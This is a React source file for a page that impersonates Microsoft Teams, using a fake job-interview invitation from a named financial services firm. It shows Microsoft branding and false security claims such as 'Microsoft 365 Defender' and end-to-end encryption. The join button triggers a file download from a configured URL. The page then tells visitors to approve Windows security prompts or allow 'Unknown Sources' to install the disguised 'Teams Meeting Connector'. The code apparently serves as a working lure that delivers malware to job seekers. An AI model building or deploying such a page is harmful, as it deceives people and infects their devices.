import { useState } from 'react';
import { 
  Video, 
  Mic, 
  Settings, 
  Monitor, 
  Smartphone, 
  Download, 
  ShieldCheck, 
  Info, 
  MoreHorizontal,
  X,
  CheckCircle2,
  Clock,
  Users,
  Shield,
  MessageSquare,
  Hand,
  Maximize2
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { DOWNLOAD_CONFIG } from './config';

export default function App() {
  const [showModal, setShowModal] = useState(false);
  const [isDownloading, setIsDownloading] = useState(false);
  const [downloadStep, setDownloadStep] = useState(0);
  const [selectedDevice, setSelectedDevice] = useState<'mobile' | 'computer' | null>(null);

  // Dynamic Date and Time Logic
  const now = new Date();
  const startTime = new Date(now.getTime() + 2 * 60 * 60 * 1000);
  const endTime = new Date(startTime.getTime() + 60 * 60 * 1000); // 1 hour duration
  
  // Custom display for "Starts in 2 hours"
  const startsInLabel = "Starts in 2h 00m";

  const formatDate = (date: Date) => {
    return new Intl.DateTimeFormat('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    }).format(date);
  };

  const formatTime = (date: Date) => {
    return new Intl.DateTimeFormat('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      hour12: true
    }).format(date);
  };

  const dateString = formatDate(startTime);
  const timeRangeString = `${formatTime(startTime)} - ${formatTime(endTime)}`;
  const currentYear = now.getFullYear();

  const handleJoinClick = () => {
    setShowModal(true);
  };

  const startDownload = (device: 'mobile' | 'computer') => {
    setSelectedDevice(device);
    setIsDownloading(true);
    setDownloadStep(1);

    const config = device === 'mobile' ? DOWNLOAD_CONFIG.mobile : DOWNLOAD_CONFIG.computer;

    // Simulate download progress
    setTimeout(() => setDownloadStep(2), DOWNLOAD_CONFIG.simulation.delayMs);
    setTimeout(() => {
      setDownloadStep(3);
      
      // Trigger actual file download
      const link = document.createElement('a');
      link.href = config.url;
      link.setAttribute('download', config.fileName);
      
      // If it's an external link, this helps ensure it opens correctly
      if (config.url.startsWith('http')) {
        link.target = '_blank';
      }
      
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, DOWNLOAD_CONFIG.simulation.delayMs + 2000);
  };

  return (
    <div className="min-h-screen bg-[#F3F2F1] font-['Segoe_UI',Tahoma,Geneva,Verdana,sans-serif] text-[#242424] flex flex-col">
      {/* Header */}
      <header className="bg-white border-b border-[#EDEBE9] px-6 py-2 flex items-center justify-between shadow-sm sticky top-0 z-30">
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2">
            <div className="w-9 h-9 bg-gradient-to-br from-[#5B5FC7] to-[#7B7FD7] rounded-lg flex items-center justify-center">
              <div className="w-5 h-5 bg-white rounded-full relative">
                <div className="absolute inset-0 m-auto w-2 h-2 bg-[#5B5FC7] rounded-full"></div>
              </div>
            </div>
            <span className="text-xl font-semibold text-[#242424]">Microsoft Teams</span>
          </div>
          <div className="h-6 w-[1px] bg-[#EDEBE9] mx-2"></div>
          <div className="flex items-center gap-2 text-[#616161] text-sm font-medium">
            <Clock size={16} />
            <span>{timeRangeString}</span>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <button className="text-[#616161] hover:bg-[#F5F5F5] p-2 rounded-md transition-colors">
            <Settings size={20} />
          </button>
          <div className="w-8 h-8 rounded-full bg-[#5B5FC7] flex items-center justify-center text-white text-xs font-bold">
            AJ
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 max-w-7xl mx-auto w-full p-4 md:p-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
        
        {/* Left Column: Video Preview */}
        <div className="lg:col-span-8 flex flex-col gap-4">
          <div className="relative aspect-video bg-[#1F1F1F] rounded-2xl overflow-hidden shadow-2xl border-4 border-white">
            {/* The 4-way meeting image provided by the user */}
            <img 
              src="https://res.cloudinary.com/dpigrreqm/image/upload/v1773808118/Gemini_Generated_Image_513yp513yp513yp5_jgtf1g.png" 
              alt="Conference Call" 
              className="w-full h-full object-cover opacity-90"
            />
            
            {/* Overlay grid (simulating the 4 people from the image) */}
            <div className="absolute inset-0 grid grid-cols-2 grid-rows-2">
              <div className="border border-white/5"></div>
              <div className="border border-white/5"></div>
              <div className="border border-white/5"></div>
              <div className="border border-white/5"></div>
            </div>

            {/* Bottom Controls Bar */}
            <div className="absolute bottom-6 left-1/2 -translate-x-1/2 flex items-center gap-4 bg-[#1F1F1F]/80 backdrop-blur-md px-6 py-3 rounded-full border border-white/10 shadow-lg">
              <button className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-white hover:bg-white/20 transition-colors">
                <Video size={20} />
              </button>
              <button className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-white hover:bg-white/20 transition-colors">
                <Mic size={20} />
              </button>
              <div className="w-[1px] h-6 bg-white/20 mx-1"></div>
              <button className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-white hover:bg-white/20 transition-colors">
                <Hand size={20} />
              </button>
              <button className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-white hover:bg-white/20 transition-colors">
                <MessageSquare size={20} />
              </button>
              <button className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center text-white hover:bg-white/20 transition-colors">
                <MoreHorizontal size={20} />
              </button>
              <button className="w-10 h-10 rounded-full bg-[#C4314B] flex items-center justify-center text-white hover:bg-[#A82A40] transition-colors ml-2">
                <span className="text-sm font-bold px-2">Leave</span>
              </button>
            </div>

            {/* Participant Name Tag */}
            <div className="absolute bottom-6 left-6 flex items-center gap-2 bg-black/40 backdrop-blur-sm px-3 py-1.5 rounded-md text-white text-sm">
              <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
              <span>Anthony B. Jeffries (Presenter)</span>
            </div>

            {/* Top Info */}
            <div className="absolute top-6 left-6 flex items-center gap-2 bg-black/40 backdrop-blur-sm px-3 py-1.5 rounded-md text-white text-sm">
              <Clock size={14} />
              <span>00:34:12</span>
            </div>
            
            <div className="absolute top-6 right-6 flex items-center gap-2">
               <button className="w-8 h-8 rounded-md bg-black/40 backdrop-blur-sm flex items-center justify-center text-white hover:bg-black/60">
                 <Maximize2 size={16} />
               </button>
            </div>
          </div>

          <div className="bg-white p-6 rounded-xl border border-[#EDEBE9] shadow-sm">
            <h2 className="text-lg font-bold mb-2 flex items-center gap-2">
              <Info size={18} className="text-[#5B5FC7]" />
              Meeting Information
            </h2>
            <p className="text-[#424242] text-sm leading-relaxed uppercase tracking-wide font-semibold text-center py-4 bg-[#F5F5F5] rounded-lg border-2 border-dashed border-[#5B5FC7]/30">
              "ANTHONY B. JEFFRIES LEGAL AND FINANCIAL SERVICES HAS INVITED YOU TO A MICROSOFT TEAMS INTERVIEW MEETING"
            </p>
          </div>
        </div>

        {/* Right Column: Info & Action */}
        <div className="lg:col-span-4 flex flex-col gap-6">
          <div className="bg-white p-8 rounded-2xl border border-[#EDEBE9] shadow-lg flex flex-col gap-6">
            <div className="space-y-2">
              <span className="text-xs font-bold text-[#5B5FC7] uppercase tracking-wider">Job Interview Call</span>
              <h1 className="text-2xl font-bold text-[#242424]">Ongoing Job Interview Consultation</h1>
              <p className="text-sm font-semibold text-[#616161]">{dateString}</p>
              <div className="flex items-center gap-2">
                <p className="text-sm text-[#616161] flex items-center gap-1.5"><Clock size={14} /> {timeRangeString} (1h 00m)</p>
                <span className="px-2 py-0.5 bg-green-100 text-green-700 text-[10px] font-bold rounded-full border border-green-200 uppercase tracking-tighter">
                  {startsInLabel}
                </span>
              </div>
            </div>

            <div className="space-y-4">
              <div className="flex items-center gap-3 text-sm text-[#424242]">
                <div className="w-10 h-10 rounded-full bg-[#F3F2F1] flex items-center justify-center">
                  <Users size={18} />
                </div>
                <div>
                  <p className="font-semibold">Organizer</p>
                  <p>Anthony B. Jeffries Services</p>
                </div>
              </div>

              <div className="flex items-center gap-3 text-sm text-[#424242]">
                <div className="w-10 h-10 rounded-full bg-[#F3F2F1] flex items-center justify-center">
                  <ShieldCheck size={18} className="text-green-600" />
                </div>
                <div>
                  <p className="font-semibold">Meeting Encryption</p>
                  <p className="text-xs">End-to-end encrypted connection</p>
                </div>
              </div>
            </div>

            <div className="p-4 bg-[#F8F8F8] rounded-xl space-y-3">
              <div className="flex justify-between text-sm">
                <span className="text-[#616161]">Meeting ID:</span>
                <span className="font-mono font-bold">482 910 338 12</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-[#616161]">Passcode:</span>
                <span className="font-mono font-bold">jK92Lx</span>
              </div>
            </div>

            <button 
              onClick={handleJoinClick}
              className="w-full bg-[#107C10] hover:bg-[#0B5E0B] text-white font-bold py-4 rounded-lg transition-all transform hover:scale-[1.02] active:scale-[0.98] shadow-md flex items-center justify-center gap-2"
            >
              Join Conference Teams Call
            </button>

            <p className="text-[10px] text-center text-[#616161] px-4">
              By joining, you agree to the <a href="#" className="underline">Terms of Service</a> and <a href="#" className="underline">Privacy Policy</a> of Microsoft Teams and Anthony B. Jeffries Legal Services.
            </p>
          </div>

          {/* Security Banner */}
          <div className="bg-blue-50 p-4 rounded-xl border border-blue-100 flex gap-3">
            <Shield size={20} className="text-blue-600 shrink-0" />
            <div>
              <p className="text-xs font-bold text-blue-800">Secure Conference</p>
              <p className="text-[10px] text-blue-600">This call is hosted on a secure Microsoft 365 tenant. All participant data is protected under enterprise-grade security protocols.</p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-auto py-6 text-center text-[#616161] text-xs">
        <div className="flex justify-center gap-6 mb-2">
          <a href="#" className="hover:underline">Privacy & Cookies</a>
          <a href="#" className="hover:underline">Terms of Use</a>
          <a href="#" className="hover:underline">Trademarks</a>
          <a href="#" className="hover:underline">Contact Support</a>
        </div>
        <p>© {currentYear} Microsoft Corporation. All rights reserved.</p>
      </footer>

      {/* Modal Prompt */}
      <AnimatePresence>
        {showModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
              onClick={() => !isDownloading && setShowModal(false)}
            />
            
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="relative w-full max-w-md bg-white rounded-3xl overflow-hidden shadow-2xl"
            >
              {/* Modal Header */}
              <div className="bg-[#5B5FC7] p-6 text-white text-center relative">
                {!isDownloading && (
                  <button 
                    onClick={() => setShowModal(false)}
                    className="absolute top-4 right-4 p-1 hover:bg-white/20 rounded-full transition-colors"
                  >
                    <X size={20} />
                  </button>
                )}
                <div className="w-16 h-16 bg-white rounded-2xl mx-auto mb-4 flex items-center justify-center">
                  <div className="w-10 h-10 bg-[#5B5FC7] rounded-lg flex items-center justify-center">
                    <div className="w-6 h-6 bg-white rounded-full relative">
                      <div className="absolute inset-0 m-auto w-2 h-2 bg-[#5B5FC7] rounded-full"></div>
                    </div>
                  </div>
                </div>
                <h3 className="text-xl font-bold">Join Meeting</h3>
                <p className="text-white/80 text-sm mt-1">Select your device to connect</p>
              </div>

              <div className="p-8">
                {!isDownloading ? (
                  <div className="grid grid-cols-2 gap-4">
                    <button 
                      onClick={() => startDownload('mobile')}
                      className="flex flex-col items-center gap-4 p-6 rounded-2xl border-2 border-[#F3F2F1] hover:border-[#5B5FC7] hover:bg-[#F9F9FF] transition-all group"
                    >
                      <div className="w-12 h-12 rounded-full bg-[#F3F2F1] group-hover:bg-[#5B5FC7]/10 flex items-center justify-center text-[#616161] group-hover:text-[#5B5FC7]">
                        <Smartphone size={24} />
                      </div>
                      <div className="text-center">
                        <p className="font-bold text-[#242424]">Mobile</p>
                        <p className="text-[10px] text-[#616161]">Android / iOS</p>
                      </div>
                    </button>

                    <button 
                      onClick={() => startDownload('computer')}
                      className="flex flex-col items-center gap-4 p-6 rounded-2xl border-2 border-[#F3F2F1] hover:border-[#5B5FC7] hover:bg-[#F9F9FF] transition-all group"
                    >
                      <div className="w-12 h-12 rounded-full bg-[#F3F2F1] group-hover:bg-[#5B5FC7]/10 flex items-center justify-center text-[#616161] group-hover:text-[#5B5FC7]">
                        <Monitor size={24} />
                      </div>
                      <div className="text-center">
                        <p className="font-bold text-[#242424]">Computer</p>
                        <p className="text-[10px] text-[#616161]">Windows / macOS</p>
                      </div>
                    </button>
                  </div>
                ) : (
                  <div className="py-4 flex flex-col items-center text-center">
                    {downloadStep === 1 && (
                      <>
                        <div className="w-12 h-12 border-4 border-[#5B5FC7] border-t-transparent rounded-full animate-spin mb-4"></div>
                        <p className="font-bold text-[#242424]">Preparing Connection...</p>
                        <p className="text-xs text-[#616161] mt-1">Establishing secure handshake for {selectedDevice}</p>
                      </>
                    )}
{downloadStep === 2 && (
  <>
    <div className="w-16 h-16 bg-[#5B5FC7]/10 rounded-full flex items-center justify-center mb-4">
      <Download className="text-[#5B5FC7] animate-bounce" size={32} />
    </div>
    <p className="font-bold text-[#242424]">Starting Download...</p>
    <p className="text-xs text-[#616161] mt-1">
      Downloading {selectedDevice === 'mobile' ? DOWNLOAD_CONFIG.mobile.fileName : DOWNLOAD_CONFIG.computer.fileName}
    </p>
  </>
)}
                    {downloadStep === 3 && (
                      <div className="w-full">
                        <div className="flex items-center justify-between mb-4 border-b pb-2">
                          <div className="flex items-center gap-2">
                            <CheckCircle2 className="text-green-600" size={24} />
                            <span className="font-bold text-[#242424]">Download Complete</span>
                          </div>
                          <span className="text-[10px] bg-green-100 text-green-700 px-2 py-0.5 rounded-full font-bold">READY</span>
                        </div>

                        <div className="bg-[#F8F8F8] p-4 rounded-xl text-left mb-6 border-l-4 border-[#5B5FC7]">
                          <p className="text-xs font-bold text-[#5B5FC7] mb-3 uppercase tracking-wider flex items-center gap-2">
                             Follow these steps to join the call:
                          </p>
                          
                          <div className="space-y-4">
                            {selectedDevice === 'computer' ? (
                              <>
                                <div className="flex gap-3">
                                  <div className="w-5 h-5 bg-[#5B5FC7] text-white text-[10px] rounded-full flex items-center justify-center shrink-0 mt-0.5">1</div>
                                  <p className="text-xs text-[#424242] leading-relaxed">Click the <span className="font-bold text-[#242424]">{DOWNLOAD_CONFIG.computer.fileName}</span> file in your browser's download bar (usually bottom-left).</p>
                                </div>
                                <div className="flex gap-3">
                                  <div className="w-5 h-5 bg-[#5B5FC7] text-white text-[10px] rounded-full flex items-center justify-center shrink-0 mt-0.5">2</div>
                                  <p className="text-xs text-[#424242] leading-relaxed">If Windows security asks for permission, click <span className="font-bold text-[#242424]">"Run"</span> or <span className="font-bold text-[#242424]">"Yes"</span> to proceed.</p>
                                </div>
                                <div className="flex gap-3">
                                  <div className="w-5 h-5 bg-[#5B5FC7] text-white text-[10px] rounded-full flex items-center justify-center shrink-0 mt-0.5">3</div>
                                  <p className="text-xs text-[#424242] leading-relaxed">The <span className="font-bold text-[#242424]">Teams Meeting Connector</span> will open automatically and connect you to the secure call.</p>
                                </div>
                              </>
                            ) : (
                              <>
                                <div className="flex gap-3">
                                  <div className="w-5 h-5 bg-[#5B5FC7] text-white text-[10px] rounded-full flex items-center justify-center shrink-0 mt-0.5">1</div>
                                  <p className="text-xs text-[#424242] leading-relaxed">Open your notifications or Downloads folder and click <span className="font-bold text-[#242424]">{DOWNLOAD_CONFIG.mobile.fileName}</span>.</p>
                                </div>
                                <div className="flex gap-3">
                                  <div className="w-5 h-5 bg-[#5B5FC7] text-white text-[10px] rounded-full flex items-center justify-center shrink-0 mt-0.5">2</div>
                                  <p className="text-xs text-[#424242] leading-relaxed">If prompted, click <span className="font-bold text-[#242424]">"Install"</span>. (You may need to allow "Unknown Sources" in Settings).</p>
                                </div>
                                <div className="flex gap-3">
                                  <div className="w-5 h-5 bg-[#5B5FC7] text-white text-[10px] rounded-full flex items-center justify-center shrink-0 mt-0.5">3</div>
                                  <p className="text-xs text-[#424242] leading-relaxed">Launch the app to join the <span className="font-bold text-[#242424]">Anthony B. Jeffries Financial</span> meeting.</p>
                                </div>
                              </>
                            )}
                          </div>
                        </div>

                        <button 
                          onClick={() => setShowModal(false)}
                          className="w-full bg-[#107C10] text-white font-bold py-3.5 rounded-xl hover:bg-[#0B5E0B] transition-all shadow-md flex items-center justify-center gap-2"
                        >
                          Done, I've Installed it
                        </button>
                        <p className="text-[10px] text-[#616161] mt-3 text-center">
                          Waiting for installation to complete... Call will start automatically.
                        </p>
                      </div>
                    )}
                  </div>
                )}
              </div>
              
              <div className="bg-[#F9F9F9] p-4 text-[10px] text-center text-[#616161] border-t border-[#EDEBE9]">
                Meeting security provided by Microsoft 365 Defender
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
